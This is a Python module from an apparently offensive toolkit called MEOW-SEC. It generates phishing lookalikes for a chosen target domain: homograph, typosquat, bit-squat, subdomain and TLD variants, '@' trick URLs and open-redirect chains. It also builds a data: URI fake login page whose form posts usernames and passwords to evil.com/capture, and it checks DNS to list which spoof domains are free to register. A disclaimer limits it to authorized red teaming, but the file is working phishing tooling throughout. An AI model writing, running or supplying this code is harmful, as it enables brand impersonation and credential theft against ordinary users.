# -*- coding: utf-8 -*-
"""
MEOW-SEC :: URLSPOOF — URL Spoofing & Lookalike Domain Generator
For authorized red team, phishing simulation and security awareness only.
"""
import os, json, re, unicodedata
from datetime import datetime
from urllib.parse import urlparse, quote

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

# ─── HOMOGRAPH TABLES ─────────────────────────────────────────
# Latin → Unicode lookalikes (Cyrillic, Greek, IPA...)
_HOMO_MAP = {
    'a': ['а', 'ɑ', 'α', 'ạ', 'ä', 'å'],   # Cyrillic а / Greek alpha
    'b': ['Ƅ', 'ƅ', 'ḃ'],
    'c': ['с', 'ϲ', 'ć', 'č'],              # Cyrillic с
    'd': ['ԁ', 'ḋ', 'ď'],                   # Cyrillic small d
    'e': ['е', 'ė', 'ë', 'ę', 'ε'],         # Cyrillic е
    'g': ['ɡ', 'ġ', 'ĝ'],
    'h': ['һ', 'ḥ', 'ĥ'],                   # Cyrillic h
    'i': ['і', 'ı', 'ï', 'î', 'ĩ'],         # Cyrillic і
    'j': ['ϳ', 'ĵ'],
    'k': ['κ', 'ķ', 'ƙ'],
    'l': ['ⅼ', 'Ɩ', 'ĺ', 'ļ'],             # Roman numeral l
    'm': ['ṁ', 'ɱ', 'м'],                   # Cyrillic м
    'n': ['η', 'ñ', 'ń', 'ņ'],              # Greek eta
    'o': ['о', 'ο', 'ö', 'ō', 'ø', '0'],   # Cyrillic о / Greek o
    'p': ['р', 'ρ', 'ṗ'],                   # Cyrillic р / Greek rho
    'q': ['ԛ', 'ɋ'],
    'r': ['г', 'ŕ', 'ř'],
    's': ['ѕ', 'ṡ', 'ś', 'š'],             # Cyrillic ѕ
    't': ['τ', 'ţ', 'ť'],                   # Greek tau
    'u': ['υ', 'ü', 'ū', 'ú'],             # Greek upsilon
    'v': ['ν', 'ṿ'],                        # Greek nu
    'w': ['ѡ', 'ω', 'ŵ'],
    'x': ['х', 'χ'],                        # Cyrillic х / Greek chi
    'y': ['у', 'ý', 'ÿ'],                   # Cyrillic у
    'z': ['ζ', 'ż', 'ž'],
}

# TLD swaps / common combos
_TLD_SWAPS = ['.com', '.net', '.org', '.io', '.co', '.app', '.site',
              '.online', '.store', '.info', '.cc', '.biz', '.xyz']

# Common subdomain tricks
_SUBDOMAIN_TRICKS = [
    "secure",
    "login",
    "account",
    "auth",
    "verify",
    "support",
    "portal",
    "my",
    "update",
    "confirm",
]

# Keyboard-adjacent typos (QWERTY)
_TYPO_MAP = {
    'a': 'qsz', 'b': 'vghn', 'c': 'xdfv', 'd': 'esxcf', 'e': 'wrsd',
    'f': 'rcdgv', 'g': 'tfhbv', 'h': 'ygjbn', 'i': 'ujko', 'j': 'uhknm',
    'k': 'ijlom', 'l': 'kop', 'm': 'nkj', 'n': 'bhjm', 'o': 'iklp',
    'p': 'ol', 'q': 'wa', 'r': 'etdf', 's': 'awedxz', 't': 'yrfg',
    'u': 'yihjk', 'v': 'cfgb', 'w': 'qase', 'x': 'zsdc', 'y': 'tuihg',
    'z': 'asx',
}

# ─── GENERATORS ───────────────────────────────────────────────

def _extract_domain(target: str) -> tuple:
    """Returns (sld, tld, full_domain) from a URL or domain."""
    target = target.lower().strip()
    if not target.startswith("http"):
        target = "https://" + target
    parsed = urlparse(target)
    host = parsed.netloc or parsed.path
    host = host.split(":")[0].lstrip("www.")
    parts = host.rsplit(".", 2)
    if len(parts) >= 2:
        tld = "." + parts[-1]
        sld = parts[-2]
    else:
        tld = ".com"
        sld = parts[0]
    return sld, tld, host

def gen_homographs(sld: str, tld: str) -> list:
    """Generate IDN homograph variants of a domain."""
    results = []
    for i, char in enumerate(sld):
        if char in _HOMO_MAP:
            for lookalike in _HOMO_MAP[char][:3]:
                variant = sld[:i] + lookalike + sld[i+1:]
                try:
                    encoded = variant.encode("idna").decode("ascii")
                    punycode = f"xn--{variant.encode('punycode').decode()}" if encoded != variant + tld else ""
                    results.append({
                        "type": "Homograph (IDN)",
                        "domain": variant + tld,
                        "punycode": encoded + tld if encoded else "",
                        "char": f"{char} → {lookalike} (U+{ord(lookalike):04X})",
                        "risk": "CRITICAL",
                    })
                except (UnicodeError, UnicodeDecodeError):
                    pass
    return results[:15]

def gen_typosquatting(sld: str, tld: str) -> list:
    """Classic typosquatting: missing letter, doubled letter, adjacent key, swap."""
    results = []
    # Missing letter
    for i in range(len(sld)):
        variant = sld[:i] + sld[i+1:]
        if variant and variant != sld:
            results.append({"type": "Missing letter", "domain": variant + tld, "risk": "HIGH", "char": f"-{sld[i]}"})
    # Double letter
    for i, c in enumerate(sld):
        variant = sld[:i] + c + sld[i:]
        results.append({"type": "Double letter", "domain": variant + tld, "risk": "HIGH", "char": f"+{c}"})
    # Adjacent key swap
    for i, c in enumerate(sld):
        if c in _TYPO_MAP:
            for adj in _TYPO_MAP[c][:2]:
                variant = sld[:i] + adj + sld[i+1:]
                results.append({"type": "Keyboard typo", "domain": variant + tld, "risk": "HIGH", "char": f"{c}→{adj}"})
    # Swap adjacent chars
    for i in range(len(sld) - 1):
        variant = sld[:i] + sld[i+1] + sld[i] + sld[i+2:]
        results.append({"type": "Char swap", "domain": variant + tld, "risk": "MEDIUM", "char": f"{sld[i]}{sld[i+1]}↔"})
    return results[:20]

def gen_subdomain_tricks(sld: str, tld: str, full: str) -> list:
    results = []
    # secure-brand.evil.com
    results.append({"type": "Subdomain (legit prefix)", "domain": f"{sld}.{sld}evil.com", "risk": "HIGH"})
    # brand-secure.com
    for sub in _SUBDOMAIN_TRICKS[:6]:
        results.append({"type": "Brand-keyword combo", "domain": f"{sld}-{sub}{tld}", "risk": "HIGH"})
        results.append({"type": "Keyword-brand combo", "domain": f"{sub}-{sld}{tld}", "risk": "HIGH"})
        results.append({"type": "Subdomain of attacker", "domain": f"{sld}.{sub}-verify.com", "risk": "CRITICAL"})
    # TLD swap
    for t in _TLD_SWAPS:
        if t != tld:
            results.append({"type": "TLD swap", "domain": sld + t, "risk": "MEDIUM"})
    return results[:20]

def gen_at_trick(full: str) -> list:
    """The infamous user:pass@evil.com trick — URL parses host as evil.com."""
    return [
        {"type": "@ trick (RFC3986)", "domain": f"https://{full}@evil-attacker.com", "risk": "HIGH",
         "note": "Browser shows evil-attacker.com, link navigates there"},
        {"type": "@ trick (creds style)", "domain": f"https://secure-{full}:password@evil-attacker.com", "risk": "HIGH",
         "note": "Some users read the left part as the real domain"},
    ]

def gen_open_redirect(full: str, redirect_base: str) -> list:
    """Chain an open redirect on the real domain to point to phish."""
    phish = "https://evil-attacker.com/phish"
    return [
        {"type": "Open redirect chain", "domain": f"{redirect_base}?url={quote(phish)}", "risk": "CRITICAL",
         "note": "Starts from the real domain, redirects to phish"},
        {"type": "Open redirect (encoded)", "domain": f"{redirect_base}?next={quote(phish, safe='')}", "risk": "CRITICAL"},
        {"type": "Open redirect (double encoded)", "domain": f"{redirect_base}?redirect={quote(quote(phish))}", "risk": "HIGH"},
    ]

def gen_data_uri() -> list:
    """data: URI phishing — no domain at all."""
    html = '<html><body><h1>Secure Login</h1><form method=POST action=https://evil.com/capture><input name=user><input name=pass type=password><button>Login</button></form></body></html>'
    b64 = __import__('base64').b64encode(html.encode()).decode()
    return [
        {"type": "data: URI", "domain": f"data:text/html;base64,{b64[:40]}...", "risk": "MEDIUM",
         "note": "No domain — evades URL scanners"},
        {"type": "data: URI (plain)", "domain": f"data:text/html,{quote(html)[:60]}...", "risk": "MEDIUM"},
    ]

def gen_bit_squatting(sld: str, tld: str) -> list:
    """Flip single bits in ASCII to get visually identical domains."""
    results = []
    for i, c in enumerate(sld):
        code = ord(c)
        for bit in range(7):
            flipped = code ^ (1 << bit)
            if 0x21 <= flipped <= 0x7e and chr(flipped).isalnum():
                variant = sld[:i] + chr(flipped) + sld[i+1:]
                if variant != sld:
                    results.append({
                        "type": "Bit-squatting",
                        "domain": variant + tld,
                        "risk": "MEDIUM",
                        "char": f"{c}→{chr(flipped)} (bit {bit})",
                    })
    return results[:10]

# ─── CHECK REGISTRATION ───────────────────────────────────────

def _check_registered(domain: str) -> str:
    """Quick DNS check: returns 'TAKEN', 'FREE', or 'ERR'."""
    import socket
    try:
        socket.setdefaulttimeout(3)
        socket.gethostbyname(domain.split("/")[0])
        return "TAKEN"
    except socket.gaierror:
        return "FREE"
    except Exception:
        return "ERR"

# ─── SAVE ─────────────────────────────────────────────────────

def _save(target: str, results: list):
    os.makedirs("data", exist_ok=True)
    fname = f"data/urlspoof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "variants": results, "ts": datetime.now().isoformat()}, f, indent=2, ensure_ascii=False)
    ok(f"Saved → {fname}")

# ─── MAIN ─────────────────────────────────────────────────────

def run():
    show_module_banner("urlspoof")

    console.print(f"\n  [{CY}]URL Spoofing & Lookalike Domain Generator[/]")
    console.print(f"  [{DM}]IDN homograph · typosquatting · subdomain tricks · @ trick · open redirect · bit-squatting[/]\n")
    warn("Authorized red team / security awareness training only.")
    console.print()

    target = ask_target("Target domain or URL (e.g. paypal.com or https://secure.bank.com)")
    if not target:
        return

    sld, tld, full = _extract_domain(target)
    info(f"Domain: {sld}{tld}  (SLD={sld}, TLD={tld})")
    console.print()

    console.print(f"  [{CY}]Techniques:[/]")
    console.print(f"  [{G2}][1][/] IDN Homograph (Cyrillic/Greek lookalikes)")
    console.print(f"  [{G2}][2][/] Typosquatting (missing, double, keyboard, swap)")
    console.print(f"  [{G2}][3][/] Subdomain & TLD tricks")
    console.print(f"  [{G2}][4][/] @ trick + data: URI")
    console.print(f"  [{G2}][5][/] Open redirect chain")
    console.print(f"  [{G2}][6][/] Bit-squatting")
    console.print(f"  [{G2}][7][/] All + DNS registration check")

    mode = ask_choice("Mode") or "7"

    all_results = []

    if mode in ("1", "7"):
        r = gen_homographs(sld, tld)
        console.print(f"\n  [{CY}]── IDN Homographs ({len(r)}) ──[/]")
        for v in r:
            color = RD if v["risk"] == "CRITICAL" else OR
            console.print(f"  [{color}][{v['risk']}][/{color}]  {v['domain']}  [{DM}]{v.get('char','')}[/]")
        all_results += r

    if mode in ("2", "7"):
        r = gen_typosquatting(sld, tld)
        console.print(f"\n  [{CY}]── Typosquatting ({len(r)}) ──[/]")
        for v in r:
            console.print(f"  [{OR}][{v['risk']}][/{OR}]  {v['domain']}  [{DM}]{v.get('char','')}[/]")
        all_results += r

    if mode in ("3", "7"):
        r = gen_subdomain_tricks(sld, tld, full)
        console.print(f"\n  [{CY}]── Subdomain & TLD tricks ({len(r)}) ──[/]")
        for v in r:
            color = RD if v["risk"] == "CRITICAL" else OR
            console.print(f"  [{color}][{v['risk']}][/{color}]  {v['domain']}")
        all_results += r

    if mode in ("4", "7"):
        r = gen_at_trick(full) + gen_data_uri()
        console.print(f"\n  [{CY}]── @ Trick & data: URI ({len(r)}) ──[/]")
        for v in r:
            color = RD if v["risk"] in ("CRITICAL", "HIGH") else OR
            console.print(f"  [{color}][{v['risk']}][/{color}]  {v['domain']}")
            if v.get("note"):
                console.print(f"  [{DM}]  ↳ {v['note']}[/]")
        all_results += r

    if mode in ("5", "7"):
        redirect_base_raw = ask_choice("Base URL for open redirect (e.g. https://real.com/redirect)") or f"https://{full}/redirect"
        r = gen_open_redirect(full, redirect_base_raw)
        console.print(f"\n  [{CY}]── Open Redirect Chain ({len(r)}) ──[/]")
        for v in r:
            color = RD if v["risk"] == "CRITICAL" else OR
            console.print(f"  [{color}][{v['risk']}][/{color}]  {v['domain'][:120]}")
        all_results += r

    if mode in ("6", "7"):
        r = gen_bit_squatting(sld, tld)
        console.print(f"\n  [{CY}]── Bit-squatting ({len(r)}) ──[/]")
        for v in r:
            console.print(f"  [{OR}][{v['risk']}][/{OR}]  {v['domain']}  [{DM}]{v.get('char','')}[/]")
        all_results += r

    if mode == "7" and all_results:
        console.print(f"\n  [{CY}]── DNS Registration Check ──[/]  [{DM}](checking domains only)[/]")
        domain_variants = [v for v in all_results if v.get("domain") and not v["domain"].startswith("http") and "..." not in v["domain"]][:25]
        free_domains = []
        for v in domain_variants:
            domain_clean = v["domain"].split("/")[0]
            status = _check_registered(domain_clean)
            color = RD if status == "TAKEN" else G1 if status == "FREE" else DM
            console.print(f"  [{color}]{status:<6}[/{color}]  {domain_clean}")
            if status == "FREE":
                free_domains.append(domain_clean)
                v["registered"] = False
            elif status == "TAKEN":
                v["registered"] = True

        if free_domains:
            console.print(f"\n  [{G1}]{len(free_domains)} domains available for registration:[/]")
            for d in free_domains:
                find(f"FREE: {d}")

    console.print()
    if all_results:
        cat_talk(CAT_FOUND, f"{len(all_results)} spoofing variants generated for {sld}{tld}")
        _save(target, all_results)
    else:
        cat_talk(CAT_SCAN, "No variants generated.")
